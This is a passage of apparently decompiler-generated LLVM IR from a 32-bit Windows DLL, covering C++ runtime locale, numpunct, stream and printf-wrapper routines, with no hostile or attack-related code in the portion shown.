  store i32 %66, i32* %.pre-phi2.reload, align 4, !insn.addr !3812
  %67 = call i32 @"?_Facet_Register@std@@YAXPAV_Facet_base@1@@Z"(i32* nonnull @1), !insn.addr !3815
  store i32 %66, i32* %esi.2.reg2mem, !insn.addr !3816
  br label %dec_label_pc_10006eb9, !insn.addr !3816

dec_label_pc_10006eb9:                            ; preds = %dec_label_pc_10006e6e, %dec_label_pc_10006ea0, %dec_label_pc_10006e6a, %dec_label_pc_10006e46
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %68 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !3817
  %69 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3818
  call void @__writefsdword(i32 0, i32 %69), !insn.addr !3819
  ret i32 %esi.2.reload, !insn.addr !3820
}

define i32 @function_10006ee0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006ee0:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !3821
}

define i32 @function_10006ef0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006ef0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !3822
  %3 = add i32 %0, 4, !insn.addr !3823
  %4 = inttoptr i32 %0 to i32*, !insn.addr !3824
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %4, align 4, !insn.addr !3824
  %5 = inttoptr i32 %3 to i64*, !insn.addr !3825
  %6 = load i64, i64* %5, align 4, !insn.addr !3825
  call void @__asm_movq.31(i64 %6, i128 %2), !insn.addr !3825
  %7 = call i32 @___std_exception_copy(), !insn.addr !3826
  store i32 ptrtoint (%vtable_1002d2ec_type* @global_var_1002d2ec to i32), i32* %4, align 4, !insn.addr !3827
  ret i32 %0, !insn.addr !3828
}

define i32 @function_10006f30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006f30:
  %ecx.0.reg2mem = alloca i32, !insn.addr !3829
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !3830
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !3831
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3832
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !3833
  %2 = icmp eq i32 %arg1, 0, !insn.addr !3834
  br i1 %2, label %dec_label_pc_10006fd3, label %dec_label_pc_10006f65, !insn.addr !3835

dec_label_pc_10006f65:                            ; preds = %dec_label_pc_10006f30
  %3 = inttoptr i32 %arg1 to i32*, !insn.addr !3836
  %4 = load i32, i32* %3, align 4, !insn.addr !3836
  %5 = icmp eq i32 %4, 0, !insn.addr !3836
  %6 = icmp eq i1 %5, false, !insn.addr !3837
  br i1 %6, label %dec_label_pc_10006fd3, label %dec_label_pc_10006f6a, !insn.addr !3837

dec_label_pc_10006f6a:                            ; preds = %dec_label_pc_10006f65
  %7 = call i32 @"??2@YAPAXI@Z"(i32 24), !insn.addr !3838
  %8 = add i32 %arg2, 4, !insn.addr !3839
  %9 = inttoptr i32 %8 to i32*, !insn.addr !3839
  %10 = load i32, i32* %9, align 4, !insn.addr !3839
  %11 = icmp eq i32 %10, 0, !insn.addr !3840
  %12 = icmp eq i1 %11, false, !insn.addr !3841
  store i32 ptrtoint (i8** @global_var_10039150 to i32), i32* %ecx.0.reg2mem, !insn.addr !3841
  br i1 %12, label %dec_label_pc_10006f91, label %dec_label_pc_10006f9b, !insn.addr !3841

dec_label_pc_10006f91:                            ; preds = %dec_label_pc_10006f6a
  %13 = add i32 %10, 24, !insn.addr !3842
  %14 = inttoptr i32 %13 to i32*, !insn.addr !3842
  %15 = load i32, i32* %14, align 4, !insn.addr !3842
  %16 = icmp eq i32 %15, 0, !insn.addr !3843
  %17 = icmp eq i1 %16, false, !insn.addr !3844
  %18 = add i32 %10, 28
  %spec.select = select i1 %17, i32 %15, i32 %18
  store i32 %spec.select, i32* %ecx.0.reg2mem
  br label %dec_label_pc_10006f9b

dec_label_pc_10006f9b:                            ; preds = %dec_label_pc_10006f91, %dec_label_pc_10006f6a
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %19 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !3845
  %20 = call i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* nonnull %stack_var_-72, i8* %19), !insn.addr !3846
  %21 = add i32 %7, 4, !insn.addr !3847
  %22 = inttoptr i32 %21 to i32*, !insn.addr !3847
  store i32 0, i32* %22, align 4, !insn.addr !3847
  %23 = inttoptr i32 %7 to i32*, !insn.addr !3848
  store i32 ptrtoint (%vtable_1002dfec_type* @global_var_1002dfec to i32), i32* %23, align 4, !insn.addr !3848
  %24 = call i32 @function_10007220(i32 %20, i32 1), !insn.addr !3849
  store i32 %7, i32* %3, align 4, !insn.addr !3850
  %25 = call i32 @"??1_Locinfo@std@@QAE@XZ"(), !insn.addr !3851
  br label %dec_label_pc_10006fd3, !insn.addr !3851

dec_label_pc_10006fd3:                            ; preds = %dec_label_pc_10006f9b, %dec_label_pc_10006f65, %dec_label_pc_10006f30
  %26 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3852
  call void @__writefsdword(i32 0, i32 %26), !insn.addr !3853
  ret i32 4, !insn.addr !3854
}

define i32 @function_10006ff0() local_unnamed_addr {
dec_label_pc_10006ff0:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !3855
}

define i32 @function_10007000(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10007000:
  %.reg2mem = alloca i32, !insn.addr !3856
  %.pre-phi8.reg2mem = alloca i32*, !insn.addr !3856
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i1, align 1
  %2 = and i32 %0, 1
  %3 = icmp ne i32 %2, 0, !insn.addr !3856
  store i1 %3, i1* %stack_var_-4, align 1, !insn.addr !3856
  %4 = ptrtoint i1* %stack_var_-4 to i32, !insn.addr !3857
  %5 = call i32 @__readfsdword(i32 0), !insn.addr !3858
  store i32 %5, i32* %stack_var_-16, align 4, !insn.addr !3859
  %6 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !3860
  %7 = xor i32 %6, %4, !insn.addr !3861
  store i32 %7, i32* %stack_var_-56, align 4, !insn.addr !3862
  %8 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3863
  call void @__writefsdword(i32 0, i32 %8), !insn.addr !3864
  %9 = add i32 %1, 4, !insn.addr !3865
  %10 = inttoptr i32 %9 to i32*, !insn.addr !3865
  %11 = load i32, i32* %10, align 4, !insn.addr !3865
  %12 = add i32 %1, 56
  %13 = add i32 %11, %12, !insn.addr !3866
  %14 = inttoptr i32 %13 to i32*, !insn.addr !3866
  %15 = load i32, i32* %14, align 4, !insn.addr !3866
  %16 = add i32 %15, 4
  %17 = inttoptr i32 %16 to i32*
  %18 = load i32, i32* %17, align 4, !insn.addr !3867
  %19 = add i32 %1, 12
  %20 = add i32 %18, %19
  %21 = inttoptr i32 %20 to i32*
  %22 = load i32, i32* %21, align 4, !insn.addr !3868
  %23 = icmp eq i32 %22, 0, !insn.addr !3868
  %24 = icmp eq i1 %23, false, !insn.addr !3869
  store i32* %21, i32** %.pre-phi8.reg2mem, !insn.addr !3869
  store i32 %18, i32* %.reg2mem, !insn.addr !3869
  br i1 %24, label %dec_label_pc_10007070, label %dec_label_pc_1000705f, !insn.addr !3869

dec_label_pc_1000705f:                            ; preds = %dec_label_pc_10007000
  %25 = add i32 %1, 60, !insn.addr !3870
  %26 = add i32 %25, %18, !insn.addr !3870
  %27 = inttoptr i32 %26 to i32*, !insn.addr !3870
  %28 = load i32, i32* %27, align 4, !insn.addr !3870
  %.pre = add i32 %28, 4, !insn.addr !3871
  %.pre3 = inttoptr i32 %.pre to i32*, !insn.addr !3871
  %.pre5 = load i32, i32* %.pre3, align 4
  %.pre6 = add i32 %.pre5, %19, !insn.addr !3872
  %.pre7 = inttoptr i32 %.pre6 to i32*, !insn.addr !3872
  store i32* %.pre7, i32** %.pre-phi8.reg2mem
  store i32 %.pre5, i32* %.reg2mem
  br label %dec_label_pc_10007070

dec_label_pc_10007070:                            ; preds = %dec_label_pc_1000705f, %dec_label_pc_10007000
  %.pre-phi8.reload = load i32*, i32** %.pre-phi8.reg2mem
  %29 = load i32, i32* %.pre-phi8.reload, align 4, !insn.addr !3872
  %30 = icmp eq i32 %29, 0, !insn.addr !3872
  %31 = icmp eq i1 %30, false, !insn.addr !3873
  %32 = icmp eq i1 %31, false, !insn.addr !3874
  br i1 %32, label %dec_label_pc_10007095, label %dec_label_pc_1000712d, !insn.addr !3874

dec_label_pc_10007095:                            ; preds = %dec_label_pc_10007070
  %.reload = load i32, i32* %.reg2mem, !insn.addr !3871
  %33 = add i32 %.reload, %12, !insn.addr !3875
  %34 = inttoptr i32 %33 to i32*, !insn.addr !3875
  %35 = load i32, i32* %34, align 4, !insn.addr !3875
  %36 = add i32 %35, 32, !insn.addr !3876
  %37 = inttoptr i32 %36 to i32*, !insn.addr !3876
  %38 = load i32, i32* %37, align 4, !insn.addr !3876
  %39 = inttoptr i32 %38 to i32*, !insn.addr !3877
  %40 = load i32, i32* %39, align 4, !insn.addr !3877
  %41 = icmp eq i32 %40, 0, !insn.addr !3877
  br i1 %41, label %dec_label_pc_10007148, label %dec_label_pc_100070a5, !insn.addr !3878

dec_label_pc_100070a5:                            ; preds = %dec_label_pc_10007095
  %42 = add i32 %35, 48, !insn.addr !3879
  %43 = inttoptr i32 %42 to i32*, !insn.addr !3879
  %44 = load i32, i32* %43, align 4, !insn.addr !3879
  %45 = inttoptr i32 %44 to i32*, !insn.addr !3880
  %46 = load i32, i32* %45, align 4, !insn.addr !3880
  %47 = icmp slt i32 %46, 1
  br i1 %47, label %dec_label_pc_10007148, label %dec_label_pc_100070ae, !insn.addr !3881

dec_label_pc_100070ae:                            ; preds = %dec_label_pc_100070a5
  %48 = add i32 %46, -1, !insn.addr !3882
  store i32 %48, i32* %45, align 4, !insn.addr !3883
  %49 = load i32, i32* %37, align 4, !insn.addr !3884
  %50 = inttoptr i32 %49 to i32*, !insn.addr !3885
  %51 = load i32, i32* %50, align 4, !insn.addr !3885
  %52 = add i32 %51, 1, !insn.addr !3886
  store i32 %52, i32* %50, align 4, !insn.addr !3887
  %53 = trunc i32 %arg1 to i8, !insn.addr !3888
  %54 = inttoptr i32 %51 to i8*, !insn.addr !3888
  store i8 %53, i8* %54, align 1, !insn.addr !3888
  br label %dec_label_pc_10007148, !insn.addr !3889

dec_label_pc_1000712d:                            ; preds = %dec_label_pc_10007070
  %55 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !3862
  %56 = load i32, i32* inttoptr (i32 8 to i32*), align 8, !insn.addr !3890
  %57 = add i32 %56, %1, !insn.addr !3891
  %58 = add i32 %57, 12, !insn.addr !3892
  %59 = inttoptr i32 %58 to i32*, !insn.addr !3892
  %60 = load i32, i32* %59, align 4, !insn.addr !3892
  %61 = add i32 %55, -4, !insn.addr !3893
  %62 = inttoptr i32 %61 to i32*, !insn.addr !3893
  store i32 0, i32* %62, align 4, !insn.addr !3893
  %63 = or i32 %60, 4, !insn.addr !3894
  %64 = add i32 %55, -8, !insn.addr !3895
  %65 = inttoptr i32 %64 to i32*, !insn.addr !3895
  store i32 %63, i32* %65, align 4, !insn.addr !3895
  %66 = inttoptr i32 %57 to i32*, !insn.addr !3896
  call void @"?clear@ios_base@std@@QAEXH_N@Z"(i32* %66, i32 1, i1 ptrtoint (i32* @1 to i1)), !insn.addr !3896
  br label %dec_label_pc_10007148, !insn.addr !3896

dec_label_pc_10007148:                            ; preds = %dec_label_pc_10007095, %dec_label_pc_100070a5, %dec_label_pc_100070ae, %dec_label_pc_1000712d
  %67 = call i32 @function_1000e737(), !insn.addr !3897
  %68 = trunc i32 %67 to i8, !insn.addr !3898
  %69 = icmp eq i8 %68, 0, !insn.addr !3898
  %70 = icmp eq i1 %69, false, !insn.addr !3899
  br i1 %70, label %dec_label_pc_1000715f, label %dec_label_pc_10007158, !insn.addr !3899

dec_label_pc_10007158:                            ; preds = %dec_label_pc_10007148
  %71 = call i32 @function_10006260(), !insn.addr !3900
  br label %dec_label_pc_1000715f, !insn.addr !3900

dec_label_pc_1000715f:                            ; preds = %dec_label_pc_10007158, %dec_label_pc_10007148
  %72 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3901
  call void @__writefsdword(i32 0, i32 %72), !insn.addr !3902
  ret i32 %1, !insn.addr !3903
}

define i8 @"?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z"(i8 %arg1) local_unnamed_addr {
dec_label_pc_10007190:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !3904
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !3905
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3906
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !3907
  %3 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !3908
  store i32 %3, i32* %stack_var_-44, align 4, !insn.addr !3909
  %4 = icmp eq i32 %0, 0, !insn.addr !3910
  %spec.select = select i1 %4, i32 %3, i32 1
  %spec.select3 = select i1 %4, i32* %stack_var_-44, i32* %stack_var_-48
  store i32 %spec.select, i32* %stack_var_-48, align 4
  %esp.0 = ptrtoint i32* %spec.select3 to i32
  %5 = sext i8 %arg1 to i32, !insn.addr !3911
  %6 = add i32 %esp.0, -4, !insn.addr !3911
  %7 = inttoptr i32 %6 to i32*, !insn.addr !3911
  store i32 %5, i32* %7, align 4, !insn.addr !3911
  %8 = load i32, i32* %stack_var_-28, align 4, !insn.addr !3912
  %9 = add i32 %8, 32, !insn.addr !3913
  %10 = inttoptr i32 %9 to i32*, !insn.addr !3913
  %11 = load i32, i32* %10, align 4, !insn.addr !3913
  %12 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3914
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !3915
  %13 = trunc i32 %11 to i8, !insn.addr !3916
  ret i8 %13, !insn.addr !3916
}

define i32 @function_10007220(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007220:
  %esi.2.reg2mem = alloca i32, !insn.addr !3917
  %eax.6.reg2mem = alloca i32, !insn.addr !3917
  %eax.5.reg2mem = alloca i32, !insn.addr !3917
  %esi.1.reg2mem = alloca i32, !insn.addr !3917
  %edi.1.reg2mem = alloca i32, !insn.addr !3917
  %esi.0.reg2mem = alloca i32, !insn.addr !3917
  %edi.0.reg2mem = alloca i32, !insn.addr !3917
  %storemerge.reg2mem = alloca i32, !insn.addr !3917
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = trunc i32 %arg1 to i8
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !3918
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !3919
  %3 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3920
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !3921
  %4 = call %lconv* @_localeconv(), !insn.addr !3922
  %5 = ptrtoint %lconv* %4 to i32, !insn.addr !3922
  %6 = call i32 @__Getcvt(i32* nonnull %stack_var_-72), !insn.addr !3923
  %7 = add i32 %0, 8, !insn.addr !3924
  %8 = inttoptr i32 %7 to i32*, !insn.addr !3924
  store i32 0, i32* %8, align 4, !insn.addr !3924
  %9 = icmp eq i8 %1, 0, !insn.addr !3925
  %10 = add i32 %0, 16, !insn.addr !3926
  %11 = inttoptr i32 %10 to i32*, !insn.addr !3926
  store i32 0, i32* %11, align 4, !insn.addr !3926
  %12 = add i32 %0, 20, !insn.addr !3927
  %13 = inttoptr i32 %12 to i32*, !insn.addr !3927
  store i32 0, i32* %13, align 4, !insn.addr !3927
  store i32 ptrtoint (i8** @global_var_10039150 to i32), i32* %storemerge.reg2mem, !insn.addr !3928
  br i1 %9, label %dec_label_pc_1000728f, label %dec_label_pc_10007292, !insn.addr !3928

dec_label_pc_1000728f:                            ; preds = %dec_label_pc_10007220
  %14 = add i32 %5, 8, !insn.addr !3929
  %15 = inttoptr i32 %14 to i32*, !insn.addr !3929
  %16 = load i32, i32* %15, align 4, !insn.addr !3929
  store i32 %16, i32* %storemerge.reg2mem, !insn.addr !3929
  br label %dec_label_pc_10007292, !insn.addr !3929

dec_label_pc_10007292:                            ; preds = %dec_label_pc_10007220, %dec_label_pc_1000728f
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %17 = call i32 @__Getcvt(i32* nonnull %stack_var_-72), !insn.addr !3930
  store i32 %storemerge.reload, i32* %edi.0.reg2mem, !insn.addr !3931
  br label %dec_label_pc_100072a3, !insn.addr !3931

dec_label_pc_100072a3:                            ; preds = %dec_label_pc_100072a3, %dec_label_pc_10007292
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %18 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !3932
  %19 = load i8, i8* %18, align 1, !insn.addr !3932
  %20 = add i32 %edi.0.reload, 1, !insn.addr !3933
  %21 = icmp eq i8 %19, 0, !insn.addr !3934
  %22 = icmp eq i1 %21, false, !insn.addr !3935
  store i32 %20, i32* %edi.0.reg2mem, !insn.addr !3935
  br i1 %22, label %dec_label_pc_100072a3, label %dec_label_pc_100072aa, !insn.addr !3935

dec_label_pc_100072aa:                            ; preds = %dec_label_pc_100072a3
  %23 = sub i32 %edi.0.reload, %storemerge.reload, !insn.addr !3936
  %24 = add i32 %23, 1, !insn.addr !3937
  %25 = call i32 @function_10015618(i32 %24, i32 1), !insn.addr !3938
  %26 = icmp eq i32 %25, 0, !insn.addr !3939
  %27 = icmp eq i1 %26, false, !insn.addr !3940
  br i1 %27, label %dec_label_pc_100072c3, label %dec_label_pc_100072be, !insn.addr !3940

dec_label_pc_100072be:                            ; preds = %dec_label_pc_100072aa
  %28 = call i32 @"?_Xbad_alloc@std@@YAXXZ"(), !insn.addr !3941
  br label %dec_label_pc_100072c3, !insn.addr !3941

dec_label_pc_100072c3:                            ; preds = %dec_label_pc_100072be, %dec_label_pc_100072aa
  %29 = icmp eq i32 %24, 0, !insn.addr !3942
  br i1 %29, label %dec_label_pc_100072de, label %dec_label_pc_100072c7, !insn.addr !3943

dec_label_pc_100072c7:                            ; preds = %dec_label_pc_100072c3
  %30 = sub i32 %25, %storemerge.reload, !insn.addr !3944
  store i32 %storemerge.reload, i32* %esi.0.reg2mem, !insn.addr !3945
  store i32 %24, i32* %edi.1.reg2mem, !insn.addr !3945
  br label %dec_label_pc_100072d0, !insn.addr !3945

dec_label_pc_100072d0:                            ; preds = %dec_label_pc_100072d0, %dec_label_pc_100072c7
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %31 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !3946
  %32 = load i8, i8* %31, align 1, !insn.addr !3946
  %33 = add i32 %esi.0.reload, 1, !insn.addr !3947
  %34 = add i32 %30, %esi.0.reload, !insn.addr !3948
  %35 = inttoptr i32 %34 to i8*, !insn.addr !3948
  store i8 %32, i8* %35, align 1, !insn.addr !3948
  %36 = add i32 %edi.1.reload, -1, !insn.addr !3949
  %37 = icmp eq i32 %36, 0, !insn.addr !3949
  %38 = icmp eq i1 %37, false, !insn.addr !3950
  store i32 %33, i32* %esi.0.reg2mem, !insn.addr !3950
  store i32 %36, i32* %edi.1.reg2mem, !insn.addr !3950
  br i1 %38, label %dec_label_pc_100072d0, label %dec_label_pc_100072de, !insn.addr !3950

dec_label_pc_100072de:                            ; preds = %dec_label_pc_100072d0, %dec_label_pc_100072c3
  store i32 %25, i32* %8, align 4, !insn.addr !3951
  %39 = call i32 @function_10015618(i32 6, i32 1), !insn.addr !3952
  %40 = icmp eq i32 %39, 0, !insn.addr !3953
  %41 = icmp eq i1 %40, false, !insn.addr !3954
  br i1 %41, label %dec_label_pc_10007301, label %dec_label_pc_100072fc, !insn.addr !3954

dec_label_pc_100072fc:                            ; preds = %dec_label_pc_100072de
  %42 = call i32 @"?_Xbad_alloc@std@@YAXXZ"(), !insn.addr !3955
  br label %dec_label_pc_10007301, !insn.addr !3955

dec_label_pc_10007301:                            ; preds = %dec_label_pc_100072fc, %dec_label_pc_100072de
  %43 = sub i32 %39, ptrtoint ([6 x i8]* @global_var_10039188 to i32), !insn.addr !3956
  store i32 ptrtoint ([6 x i8]* @global_var_10039188 to i32), i32* %esi.1.reg2mem, !insn.addr !3957
  br label %dec_label_pc_10007310, !insn.addr !3957

dec_label_pc_10007310:                            ; preds = %dec_label_pc_10007310, %dec_label_pc_10007301
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %44 = inttoptr i32 %esi.1.reload to i8*, !insn.addr !3958
  %45 = load i8, i8* %44, align 1, !insn.addr !3958
  %46 = add i32 %esi.1.reload, 1, !insn.addr !3959
  %47 = add i32 %43, %esi.1.reload, !insn.addr !3960
  %48 = inttoptr i32 %47 to i8*, !insn.addr !3960
  store i8 %45, i8* %48, align 1, !insn.addr !3960
  %exitcond2 = icmp eq i32 %46, add (i32 ptrtoint ([6 x i8]* @global_var_10039188 to i32), i32 6)
  store i32 %46, i32* %esi.1.reg2mem, !insn.addr !3961
  br i1 %exitcond2, label %dec_label_pc_1000731e, label %dec_label_pc_10007310, !insn.addr !3961

dec_label_pc_1000731e:                            ; preds = %dec_label_pc_10007310
  store i32 %39, i32* %11, align 4, !insn.addr !3962
  %49 = call i32 @function_10015618(i32 5, i32 1), !insn.addr !3963
  %50 = icmp eq i32 %49, 0, !insn.addr !3964
  %51 = icmp eq i1 %50, false, !insn.addr !3965
  store i32 %49, i32* %eax.5.reg2mem, !insn.addr !3965
  br i1 %51, label %dec_label_pc_10007352, label %dec_label_pc_1000733c, !insn.addr !3965

dec_label_pc_1000733c:                            ; preds = %dec_label_pc_1000731e
  %52 = call i32 @"?_Xbad_alloc@std@@YAXXZ"(), !insn.addr !3966
  %53 = call i32 @"?_Tidy@?$numpunct@D@std@@AAEXXZ"(), !insn.addr !3967
  %54 = call i32 @"__CxxThrowException@8"(), !insn.addr !3968
  store i32 %54, i32* %eax.5.reg2mem, !insn.addr !3968
  br label %dec_label_pc_10007352, !insn.addr !3968

dec_label_pc_10007352:                            ; preds = %dec_label_pc_1000733c, %dec_label_pc_1000731e
  %eax.5.reload = load i32, i32* %eax.5.reg2mem
  %55 = sub i32 %49, ptrtoint ([5 x i8]* @global_var_10039190 to i32), !insn.addr !3969
  store i32 %eax.5.reload, i32* %eax.6.reg2mem, !insn.addr !3970
  store i32 ptrtoint ([5 x i8]* @global_var_10039190 to i32), i32* %esi.2.reg2mem, !insn.addr !3970
  br label %dec_label_pc_10007360, !insn.addr !3970

dec_label_pc_10007360:                            ; preds = %dec_label_pc_10007360, %dec_label_pc_10007352
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %eax.6.reload = load i32, i32* %eax.6.reg2mem
  %56 = inttoptr i32 %esi.2.reload to i8*, !insn.addr !3971
  %57 = load i8, i8* %56, align 1, !insn.addr !3971
  %58 = zext i8 %57 to i32, !insn.addr !3971
  %59 = and i32 %eax.6.reload, -256, !insn.addr !3971
  %60 = or i32 %59, %58, !insn.addr !3971
  %61 = add i32 %esi.2.reload, 1, !insn.addr !3972
  %62 = add i32 %55, %esi.2.reload, !insn.addr !3973
  %63 = inttoptr i32 %62 to i8*, !insn.addr !3973
  store i8 %57, i8* %63, align 1, !insn.addr !3973
  %exitcond = icmp eq i32 %61, add (i32 ptrtoint ([5 x i8]* @global_var_10039190 to i32), i32 5)
  store i32 %60, i32* %eax.6.reg2mem, !insn.addr !3974
  store i32 %61, i32* %esi.2.reg2mem, !insn.addr !3974
  br i1 %exitcond, label %dec_label_pc_1000736e, label %dec_label_pc_10007360, !insn.addr !3974

dec_label_pc_1000736e:                            ; preds = %dec_label_pc_10007360
  store i32 %49, i32* %13, align 4, !insn.addr !3975
  br i1 %9, label %dec_label_pc_10007391, label %dec_label_pc_10007377, !insn.addr !3976

dec_label_pc_10007377:                            ; preds = %dec_label_pc_1000736e
  %64 = add i32 %0, 12, !insn.addr !3977
  %65 = inttoptr i32 %64 to i16*, !insn.addr !3977
  store i16 11310, i16* %65, align 2, !insn.addr !3977
  %66 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3978
  call void @__writefsdword(i32 0, i32 %66), !insn.addr !3979
  ret i32 %60, !insn.addr !3980

dec_label_pc_10007391:                            ; preds = %dec_label_pc_1000736e
  %67 = bitcast %lconv* %4 to i32*, !insn.addr !3981
  %68 = load i32, i32* %67, align 4, !insn.addr !3981
  %69 = inttoptr i32 %68 to i8*, !insn.addr !3982
  %70 = load i8, i8* %69, align 1, !insn.addr !3982
  %71 = add i32 %0, 12, !insn.addr !3983
  %72 = inttoptr i32 %71 to i8*, !insn.addr !3983
  store i8 %70, i8* %72, align 1, !insn.addr !3983
  %73 = add i32 %5, 4, !insn.addr !3984
  %74 = inttoptr i32 %73 to i32*, !insn.addr !3984
  %75 = load i32, i32* %74, align 4, !insn.addr !3984
  %76 = inttoptr i32 %75 to i8*, !insn.addr !3985
  %77 = load i8, i8* %76, align 1, !insn.addr !3985
  %78 = zext i8 %77 to i32, !insn.addr !3985
  %79 = add i32 %0, 13, !insn.addr !3986
  %80 = inttoptr i32 %79 to i8*, !insn.addr !3986
  store i8 %77, i8* %80, align 1, !insn.addr !3986
  %81 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3987
  call void @__writefsdword(i32 0, i32 %81), !insn.addr !3988
  ret i32 %78, !insn.addr !3989
}

define i32 @function_100073c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100073c0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @___acrt_iob_func(i32 1, i32 %0, i32 %1), !insn.addr !3990
  %3 = call i32 @function_10001100(), !insn.addr !3991
  %4 = add i32 %3, 4, !insn.addr !3992
  %5 = inttoptr i32 %4 to i32*, !insn.addr !3992
  %6 = load i32, i32* %5, align 4, !insn.addr !3992
  %7 = inttoptr i32 %3 to i32*, !insn.addr !3993
  %8 = load i32, i32* %7, align 4, !insn.addr !3993
  %9 = call i32 @___stdio_common_vfprintf(i32 %8, i32 %6), !insn.addr !3994
  ret i32 %9, !insn.addr !3995
}

define i32 @function_100073f0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100073f0:
  %0 = call i32 @function_10001100(), !insn.addr !3996
  %1 = inttoptr i32 %0 to i32*, !insn.addr !3997
  %2 = load i32, i32* %1, align 4, !insn.addr !3997
  %3 = add i32 %0, 4, !insn.addr !3998
  %4 = inttoptr i32 %3 to i32*, !insn.addr !3998
  %5 = load i32, i32* %4, align 4, !insn.addr !3998
  %6 = or i32 %2, 1, !insn.addr !3999
  %7 = call i32 @___stdio_common_vsprintf(i32 %6, i32 %5), !insn.addr !4000
  %8 = icmp sgt i32 %7, -1, !insn.addr !4001
  %9 = select i1 %8, i32 %7, i32 -1, !insn.addr !4002
  ret i32 %9, !insn.addr !4003
}

define i32 @function_10007430(i32* %arg1) local_unnamed_addr {
dec_label_pc_10007430:
  %eax.1.reg2mem = alloca i32, !insn.addr !4004
  %eax.0.reg2mem = alloca i32, !insn.addr !4004
  %ecx.0.reg2mem = alloca i32, !insn.addr !4004
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = icmp sgt i32 %0, 0
  br i1 %1, label %dec_label_pc_10007450, label %dec_label_pc_1000748e, !insn.addr !4005

dec_label_pc_10007450:                            ; preds = %dec_label_pc_10007430, %dec_label_pc_10007456
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %2 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !4006
  %3 = load i16, i16* %2, align 2, !insn.addr !4006
  %4 = icmp eq i16 %3, 0, !insn.addr !4006
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !4007
  br i1 %4, label %dec_label_pc_1000745e, label %dec_label_pc_10007456, !insn.addr !4007

dec_label_pc_10007456:                            ; preds = %dec_label_pc_10007450
  %5 = add i32 %ecx.0.reload, 2, !insn.addr !4008
  %6 = add i32 %eax.0.reload, -1, !insn.addr !4009
  %7 = icmp eq i32 %6, 0, !insn.addr !4009
  %8 = icmp eq i1 %7, false, !insn.addr !4010
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !4010
  store i32 %6, i32* %eax.0.reg2mem, !insn.addr !4010
  store i32 %6, i32* %eax.1.reg2mem, !insn.addr !4010
  br i1 %8, label %dec_label_pc_10007450, label %dec_label_pc_1000745e, !insn.addr !4010

dec_label_pc_1000745e:                            ; preds = %dec_label_pc_10007456, %dec_label_pc_10007450
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %9 = icmp eq i32 %eax.1.reload, 0, !insn.addr !4011
  %10 = icmp eq i1 %9, false, !insn.addr !4012
  %11 = select i1 %10, i32 0, i32 -2147024809, !insn.addr !4012
  %12 = icmp eq i32* %arg1, null, !insn.addr !4013
